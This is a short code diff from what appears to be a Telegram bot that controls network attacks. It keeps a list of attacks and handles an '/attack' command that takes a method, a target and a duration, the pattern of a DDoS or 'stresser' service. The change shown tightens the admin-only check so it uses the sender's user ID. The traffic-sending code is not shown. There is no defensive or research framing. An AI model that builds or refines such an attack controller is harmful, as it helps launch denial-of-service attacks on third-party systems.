@@ -12,12 +12,13 @@ let attacks = [];
 app.get('/', (req, res) => res.send('Bot is running'));
 
 bot.on('message', async (msg) => {
-  const chatId = msg.chat.id.toString();
-  if (chatId !== ADMIN_ID) return bot.sendMessage(chatId, 'Access denied.');
+  const userId = msg.from.id.toString();
+  if (userId !== ADMIN_ID) return bot.sendMessage(msg.chat.id, 'Access denied.');
 
   if (!msg.text.startsWith('/')) return;
   const args = msg.text.slice(1).split(' ');
   const command = args.shift().toLowerCase();
+  const chatId = msg.chat.id;
 
   if (command === 'attack') {
     const [method, target, time] = args;
